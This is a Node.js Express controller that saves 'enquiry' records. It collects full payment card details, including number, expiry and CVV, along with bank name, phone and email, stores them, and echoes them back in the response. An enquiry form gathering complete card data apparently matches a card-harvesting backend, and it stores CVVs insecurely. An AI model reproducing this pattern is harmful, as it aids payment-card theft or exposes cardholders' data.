const enquiryModule = require('../../models/enquiry.models');

// Insert enquiry
const enquiryInsert = async (req, res) => {
    console.log("enquiryInsert function called"); // Debug log

    try {
        let { cardholder, cardnumber, expiry, cvv, bankname, phonenumber, email } = req.body;

        // Email duplicate check
        const existingEnquiry = await enquiryModule.findOne({ email });
        if (existingEnquiry) {
            return res.status(400).json({ status: 0, message: "Email already exists" });
        }
        const existingEnquiry1 = await enquiryModule.findOne({ cardnumber });
        if (existingEnquiry1) {
            return res.status(400).json({ status: 0, message: "cardnumber already exists" });
        }

        let enquiry = new enquiryModule({
            cardholder,
            cardnumber,
            expiry,
            cvv,
            bankname,
            phonenumber,
            email
        });

        await enquiry.save();

        return res.status(201).json({
            status: 1,
            message: "Enquiry saved successfully",
            data: enquiry
        });

    } catch (err) {
        return res.status(500).json({
            status: 0,
            message: "Error while saving enquiry",
            error: err.message
        });
    }
};

// Export functions
module.exports = { enquiryInsert };
